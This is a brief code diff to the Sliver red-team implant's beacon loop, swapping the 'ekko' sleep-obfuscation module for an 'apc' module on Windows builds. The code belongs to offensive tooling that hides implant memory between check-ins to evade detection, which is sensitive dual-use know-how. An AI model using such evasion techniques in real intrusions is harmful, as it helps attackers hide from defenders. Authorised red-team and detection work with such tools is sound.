@@ -51,7 +51,7 @@ import (
 	"github.com/bishopfox/sliver/implant/sliver/version"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
 	// {{if and .Config.SleepObfuscation (eq .Config.GOOS "windows")}}
-	"github.com/bishopfox/sliver/implant/sliver/ekko"
+	"github.com/bishopfox/sliver/implant/sliver/apc"
 	// {{end}}
 
 	"github.com/gofrs/uuid"
@@ -346,7 +346,7 @@ func beaconMainLoop(beacon *transports.Beacon) error {
 			timeUntilNextCheckIn := time.Until(nextCheckin)
 			if timeUntilNextCheckIn.Seconds() > 1 {
 				_ = 0
-				ekko.EkkoSleep(uint64(timeUntilNextCheckIn.Milliseconds()))
+				apc.Sleep(uint64(timeUntilNextCheckIn.Milliseconds()))
 			}
 		// {{else}}
 		case <-time.After(duration):
